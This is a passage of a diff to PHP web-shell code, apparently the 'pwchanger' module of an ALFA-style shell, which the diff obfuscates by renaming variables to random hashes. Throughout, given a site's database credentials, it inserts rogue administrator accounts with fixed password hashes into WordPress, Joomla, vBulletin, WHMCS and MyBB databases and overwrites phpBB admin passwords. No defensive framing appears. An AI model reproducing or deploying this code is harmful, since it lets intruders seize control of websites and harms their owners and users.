+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users (ID,user_login,user_pass,user_email) values(null,'$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','d4a590caacc0be55ef286e40a945ea45','$vdhryjes9778840a0100cb30c982876741b0b5a2')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select ID from ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users where user_login='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$nuabiabibeb7f7a395dc21ad97425bbc061afbaf = @mysqli_num_rows($syosrpmxd4a590caacc0be55ef286e40a945ea45);
+if ($nuabiabibeb7f7a395dc21ad97425bbc061afbaf == 1){
+$aqewfoiib3cd6a16f46d7fa04280495810dee6d7 = @mysqli_fetch_assoc($syosrpmxd4a590caacc0be55ef286e40a945ea45);
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $aqewfoiib3cd6a16f46d7fa04280495810dee6d7['ID'];
 }
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','solevisible'),(null,'".$res."','last_name','solevisible'),(null,'".$res."','nickname','solevisible'),(null,'".$res."','description','solevisible'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','first_name','solevisible'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','last_name','solevisible'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','nickname','solevisible'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','description','solevisible'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','rich_editing','true'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','comment_shortcuts','false'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','admin_color','fresh'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','use_ssl','0'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','show_admin_bar_front','true'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."user_level','10'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','show_welcome_panel','1'),(null,'".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
+__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
 }
 }
 if($_POST['alfa2'] && $_POST['alfa2'] == 'joomla'){
 
 echo __pre().'<center><center><div class="txtfont_header">| Joomla |</div><p><p>'.getConfigHtml('joomla').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',\'joomla\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
@@ -3949,33 +4022,33 @@ $table = array('td1' =>
  'td8' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
 if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa3'];
-$database = $_POST['alfa4'];
-$username = $_POST['alfa5'];
-$password = $_POST['alfa6'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
-$sole =@mysqli_num_rows($solevisible);
-if ($sole == 1){
-$solevis =@mysqli_fetch_assoc($solevisible);
-$res = $solevis['id'];
+$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa3'];
+$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa4'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa5'];
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
+$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
+$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users (id,name,username,email,password) values(null,'Super User','".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."','".$vdhryjes9778840a0100cb30c982876741b0b5a2."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select id from ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users where username='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$nuabiabibeb7f7a395dc21ad97425bbc061afbaf =@mysqli_num_rows($syosrpmxd4a590caacc0be55ef286e40a945ea45);
+if ($nuabiabibeb7f7a395dc21ad97425bbc061afbaf == 1){
+$aqewfoiib3cd6a16f46d7fa04280495810dee6d7 =@mysqli_fetch_assoc($syosrpmxd4a590caacc0be55ef286e40a945ea45);
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $aqewfoiib3cd6a16f46d7fa04280495810dee6d7['id'];
 }
-$solevisible=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"INSERT INTO ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."user_usergroup_map (user_id,group_id) VALUES ('".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."', '8')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
+__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
 }
 }
 if($_POST['alfa4'] && $_POST['alfa4'] == 'vb'){
 
 echo __pre().'<center><center><div class="txtfont_header">| vBulletin |<div><p>'.getConfigHtml('vb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,\'vb\',this.username.value,this.password.value,this.prefix.value,this.admin.value,this.email.value); return false;" method="POST">';
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
@@ -3992,41 +4065,41 @@ $table = array('td1' =>
  'td8' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
 if($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa5'];
-$password = $_POST['alfa6'];
-$prefix = $_POST['alfa7'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_connect_error());
-$pw_col = @mysqli_connect("SELECT column_name FROM information_schema.columns where table_name = '{$prefix}user' and column_name = 'password' and table_schema = '{$database}'");
-$pw_col = @mysqli_num_rows($pw_col);
-$adm_perm = "16744444";
-if($pw_col > 0){
-$solevisible=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
+$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
+$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa5'];
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa7'];
+$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
+$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_connect_error());
+$ummfyfnoc94f162c0101bf9b7a77c539f3f0a655 = @mysqli_connect("SELECT column_name FROM information_schema.columns where table_name = '{$unkkdhum851f5ac9941d720844d143ed9cfcf60a}user' and column_name = 'password' and table_schema = '{$tcmsiznr11e0eed8d3696c0a632f822df385ab3c}'");
+$ummfyfnoc94f162c0101bf9b7a77c539f3f0a655 = @mysqli_num_rows($ummfyfnoc94f162c0101bf9b7a77c539f3f0a655);
+$vqeznvdx7d2820625fde4543783ade2560bf84eb = "16744444";
+if($ummfyfnoc94f162c0101bf9b7a77c539f3f0a655 > 0){
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$vdhryjes9778840a0100cb30c982876741b0b5a2','".date('Y-m-d')."','".time()."')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
 }else{
-$adm_perm = "2143256444";
-$solevisible=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
+$vqeznvdx7d2820625fde4543783ade2560bf84eb = "2143256444";
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$vdhryjes9778840a0100cb30c982876741b0b5a2','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
 }
-$solevisible=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
-$sole = mysqli_num_rows($solevisible);
-if($sole == 1){
-$solevis = mysqli_fetch_assoc($solevisible);
-$res = $solevis['userid'];
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select userid from {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}user where username='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$nuabiabibeb7f7a395dc21ad97425bbc061afbaf = mysqli_num_rows($syosrpmxd4a590caacc0be55ef286e40a945ea45);
+if($nuabiabibeb7f7a395dc21ad97425bbc061afbaf == 1){
+$aqewfoiib3cd6a16f46d7fa04280495810dee6d7 = mysqli_fetch_assoc($syosrpmxd4a590caacc0be55ef286e40a945ea45);
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $aqewfoiib3cd6a16f46d7fa04280495810dee6d7['userid'];
 }
-$solevisible=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}administrator (userid,adminpermissions) values('".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."','".$vqeznvdx7d2820625fde4543783ade2560bf84eb."')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
+__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
 }
 }
 if(isset($_POST['alfa5']) && $_POST['alfa5'] == 'phpbb'){
 
 echo __pre().'<center><div class="txtfont_header">| phpBB |</div><p><p>'.getConfigHtml('phpbb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,\'phpbb\',this.password.value,null,this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
@@ -4043,32 +4116,32 @@ $table = array('td1' =>
  'td8' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
 if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa4'];
-$password = $_POST['alfa6'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$hash = md5('solevisible');
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');
+$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
+$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa4'];
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
+$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
+$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$horyspio0800fc577294c34e0b28ad2839435945 = md5('solevisible');
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users SET username_clean ='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."' WHERE username_clean = 'admin'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users SET user_password ='".$horyspio0800fc577294c34e0b28ad2839435945."' WHERE username_clean = 'admin'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users SET username_clean ='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."' WHERE user_type = 3") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users SET user_password ='".$horyspio0800fc577294c34e0b28ad2839435945."' WHERE user_type = 3") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users SET user_email ='".$vdhryjes9778840a0100cb30c982876741b0b5a2."' WHERE username_clean = 'admin'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
+__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');
 }
 }
 }
 if(isset($_POST['alfa6']) && $_POST['alfa6'] == 'whmcs'){
 
 echo __pre().'<center><div class="txtfont_header">| Whmcs |</div><p><p>'.getConfigHtml('whmcs').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,\'whmcs\',null,this.admin.value,this.email.value); return false;" method="POST">';
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
@@ -4083,25 +4156,25 @@ $table = array('td1' =>
  'td8' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
 if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa4'];
-$password = $_POST['alfa5'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
+$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
+$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa4'];
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa5'];
+$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
+$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."','d4a590caacc0be55ef286e40a945ea45','".$vdhryjes9778840a0100cb30c982876741b0b5a2."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
+__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
 }
 }
 if(isset($_POST['alfa7']) && $_POST['alfa7'] == 'mybb'){
 
 echo __pre().'<center><div class="txtfont_header">| Mybb |</div><p><p>'.getConfigHtml('mybb').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,\'mybb\',this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
@@ -4118,26 +4191,26 @@ $table = array('td1' =>
  'td8' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
 if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa4'];
-$password = $_POST['alfa5'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
+$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
+$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa4'];
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa5'];
+$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
+$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users (uid,username,password,salt,email,usergroup) values(null,'".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$vdhryjes9778840a0100cb30c982876741b0b5a2."','4')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
+__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
 }
 }
 if(isset($_POST['alfa8']) && $_POST['alfa8'] == 'nuke'){
 
